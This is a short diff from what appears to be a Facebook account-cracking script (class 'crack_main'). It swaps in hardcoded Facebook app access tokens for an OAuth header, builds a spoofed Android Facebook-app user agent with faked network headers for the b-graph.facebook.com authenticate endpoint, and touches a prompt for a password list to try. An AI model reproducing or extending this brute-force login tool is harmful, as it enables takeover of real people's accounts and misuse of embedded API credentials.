@@ -391,7 +391,7 @@ class crack_main():
                                         width_ = "720"
                                         height_ = "1280"
                                 uas = 'Dalvik/2.1.0 (Linux; U; Android '+str(random.randint(8,12))+'.0.0; Infinix Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix;FBSV/'+str(random.randint(8,12))+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=720,height=1280};]'
-                                fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
+                                fak_tn="153779441997719|n2YEBqamkrdDYJBUkjxmNzuZS5c","300340197101744|lGCTj7yrAEvAWivDSvcBOJXu-Lw"
                                 adid = str(uuid.uuid4())
                                 abhi = "779441997719|n2YE"
                                 head = {'Connection': 'keep-alive', 'Authorization': 'OAuth 153'+abhi+'BqamkrdDYJBUkjxmNzuZS5c', 'Host': 'b-graph.facebook.com', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)), 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)), 'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)), 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Token': '', 'X-FB-Connection-Type': 'MOBILE.WCDMA', 'User-Agent': uas, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '531'}
@@ -422,7 +422,7 @@ class crack_main():
         def pasw(self):
                 passlist = []
                 
-                print(logo)
+                os.system('clear');print(logo)
                 print(' for auto password list type auto or Auto')
                 print(50*"=")
                 pl = input(' How Much Password Do You Want To Add ? ')
